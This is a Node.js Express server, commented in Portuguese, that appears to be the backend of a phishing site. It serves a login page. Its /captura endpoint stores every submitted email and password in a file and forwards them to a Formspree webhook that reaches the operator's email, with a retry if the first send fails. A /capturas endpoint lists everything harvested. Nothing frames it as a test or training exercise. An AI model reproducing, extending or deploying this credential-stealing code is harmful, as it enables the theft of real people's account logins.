const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());

// Serve o login.html na raiz e em /login.html
const loginPath = path.join(__dirname, 'login.html');

app.get('/', (req, res) => {
  res.sendFile(loginPath);
});

app.get('/login.html', (req, res) => {
  res.sendFile(loginPath);
});

// Diretório de dados (volume montado)
const DATA_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH || path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}
const CAPTURAS_FILE = path.join(DATA_DIR, 'capturas.txt');

// Envia captura para o webhook do Formspree (que reencaminha pro seu e-mail)
async function enviarFormspree(email, password, timestamp) {
  const url = process.env.FORMSPREE_URL;
  if (!url) {
    console.warn('[formspree] FORMSPREE_URL nao configurada — pulando envio');
    return;
  }

  const res = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify({
      _subject: `Nova captura: ${email}`,
      email: email,
      senha: password,
      data: timestamp
    })
  });

  if (!res.ok) {
    throw new Error('HTTP ' + res.status + ' ' + (await res.text()));
  }
  console.log('[formspree] enviado com sucesso');
}

app.post('/captura', async (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();

  // Responde IMEDIATAMENTE (não segura o redirecionamento do usuário)
  res.status(200).json({ ok: true });

  // 1. Grava em arquivo persistente
  try {
    fs.appendFileSync(CAPTURAS_FILE, `${timestamp} | ${email} | ${password}\n`);
    console.log('[captura] gravado:', email);
  } catch (err) {
    console.error('[captura] erro ao gravar arquivo:', err.message);
  }

  // 2. Envia pro Formspree -> cai no seu e-mail (com retry)
  try {
    await enviarFormspree(email, password, timestamp);
  } catch (err) {
    console.error('[formspree] tentativa 1 falhou:', err.message);
    setTimeout(() => {
      enviarFormspree(email, password, timestamp)
        .catch(e2 => console.error('[formspree] tentativa 2 falhou:', e2.message));
    }, 3000);
  }
});

// Endpoint para verificar capturas
app.get('/capturas', (req, res) => {
  try {
    const content = fs.readFileSync(CAPTURAS_FILE, 'utf-8');
    res.type('text/plain').send(content || 'Nenhuma captura ainda.');
  } catch {
    res.send('Nenhuma captura ainda.');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Servidor rodando na porta ${PORT}`));

